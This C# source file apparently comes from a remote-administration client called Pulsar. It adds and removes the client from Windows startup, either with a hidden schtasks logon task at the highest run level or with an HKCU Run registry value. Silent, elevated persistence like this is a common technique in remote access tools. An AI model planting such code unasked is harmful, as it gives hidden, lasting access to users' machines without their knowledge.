using Microsoft.Win32;
using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        public void AddToStartup(string executablePath, string startupName)
        {
            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
               
                
                if (UserAccount.Type == AccountType.Admin)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
                                    "\" /rl HIGHEST /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return;
               
                
                }

                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                    true);

            }
            else
            {
                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                    true);
            }


        }

        public void RemoveFromStartup(string startupName)
        {


            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
                if (UserAccount.Type == AccountType.Admin)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/delete /tn \"" + startupName + "\" /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return;
                }

                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }
            else
            {
                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }
              
        }
    }
}
